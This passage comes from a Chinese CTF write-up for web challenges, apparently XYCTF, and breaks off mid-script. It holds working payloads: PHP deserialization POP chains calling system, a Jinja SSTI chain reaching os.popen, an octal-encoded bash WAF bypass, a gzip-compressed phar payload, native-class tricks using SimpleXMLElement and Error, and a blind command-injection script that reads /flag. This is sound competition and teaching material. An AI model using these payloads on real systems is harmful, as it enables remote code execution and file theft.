class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;win&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = [<span class="number">1</span> =&gt; <span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;c-&gt;s = <span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><p>配合fast-destruct</p><h2 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h2><p>admin密码: asdqwe</p><p>找catch_warnings</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xyctf.top:36318/index&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZgzePQ.xovem1N0fv78Nth8E0_iXRxY7UA&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sentence = <span class="string">&#x27;?sentence=你好()|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(&#123;&#125;)&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = url + sentence</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    <span class="built_in">print</span>(payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line">    res = requests.get(url=payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i)), headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;catch_warnings&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;found catch_warnings is in &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;出现了一点小问题&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#found catch_warnings is in 221</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sentence=你好()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(221)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)</span><br><span class="line">&amp;x1=__class__</span><br><span class="line">&amp;x2=__base__</span><br><span class="line">&amp;x3=__subclasses__</span><br><span class="line">&amp;x4=__getitem__</span><br><span class="line">&amp;x5=__init__</span><br><span class="line">&amp;x6=__globals__</span><br><span class="line">&amp;x7=__builtins__</span><br><span class="line">&amp;x8=eval</span><br><span class="line">&amp;x9=__import__(&quot;os&quot;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>没什么好说的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;password = &amp;<span class="variable">$nacl</span>-&gt;token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;luo = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lao = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span> = <span class="string">&#x27;yuroandCMD258&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span> = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;adwa = <span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&#x27;oSthing&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd_char</span>) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;foreach&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>$0为当前运行的脚本(即bash), 然后用八进制ascii传入cat &#x2F;flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\040\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure><h2 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h2><p>简单的phar反序列化, 生成的phar文件用gzip压缩绕过题目的waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;cmd = <span class="string">&#x27;print_r(file_get_contents(array_rand(array_flip(scandir(end(array_reverse(str_split(getcwd()))))))));__halt_compiler();__halt_compiler();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=phar:///tmp/364be8860e8d72b4358b5e88099a935a.png/flag.txt</span><br></pre></td></tr></table></figure><h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure><p>这种就只能考虑原生类读文件了, 我找到了SimpleXMLElement这个类,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SimpleXMLElement&amp;aa=&lt;element&gt;system&lt;/element&gt;&amp;c=__toString&amp;b=SimpleXMLElement&amp;bb=&lt;element&gt;cat /flag&lt;/element&gt;</span><br></pre></td></tr></table></figure><p>看其他师傅的wp, 也可以使用Error</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=Error&amp;b=Error&amp;aa=system&amp;bb=cat /f*&amp;c=getMessage</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>很抽象, 用bash时间盲注枚举flag</p><p>贴出我的答辩脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost:49689/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [ &quot;$(head -n 1 /flag | cut -c 1)&quot; = &quot;q&quot; ] &amp;&amp; sleep 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=if [ `cat /flag | cut -c 1` = &#x27;q&#x27; ];then sleep 5;fi&quot;</span></span><br><span class="line"></span><br><span class="line">alphabet = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span 